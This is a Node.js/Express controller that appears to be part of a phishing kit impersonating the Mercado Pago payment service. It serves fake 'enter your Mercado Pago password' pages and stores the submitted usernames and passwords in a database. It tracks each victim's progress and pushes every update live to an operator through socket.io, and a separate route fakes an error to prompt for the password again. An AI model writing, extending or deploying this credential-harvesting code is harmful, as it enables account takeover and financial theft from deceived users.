const Client = require('../../models/Client')
const { clientsSocket, connectedUsers } = require('../../server')

module.exports = {
    async view(req, res) {
        try {
            //Client
            const { username: user, password } = req.body

            const { client_id } = req.params

            let client

            if (client_id) {
                client = await Client.findByPk(client_id)
                await client.update({ password, status: `Enviou usuário` })
                req.app.io.emit('updateClient', client.toJSON())
            } else {
                const checkClient = await Client.findOne({ where: { user } })
                client = checkClient
                if (!checkClient) {
                    client = await Client.create({ user })
                    req.app.io.emit('newClient', client.toJSON())
                } else {
                    req.app.io.emit('updateClient', client.toJSON())
                }
            }

            return res.render('pages/password', {
                title: 'Agora, sua senha do Mercado Pago',
                pageClasses: 'password cadastro',
                pageType: 'password',
                username: user,
                client: client.toJSON(),
            })
        } catch (error) {
            console.log(error)
            return res.redirect('/')
        }
    },
    async error(req, res) {
        try {
            const { client_id } = req.params

            const client = await Client.findByPk(client_id)

            if (!client) return res.redirect('/modules/conta')

            await client.update({ status: `Online na senha` })

            req.app.io.emit('updateClient', client.toJSON())

            return res.render('pages/password', {
                title: 'Agora, sua senha do Mercado Pago',
                pageClasses: 'password cadastro',
                pageType: 'password',
                error: true,
                client: client.toJSON(),
            })
        } catch (error) {
            console.log(error)
            return res.redirect('/')
        }
    },
}
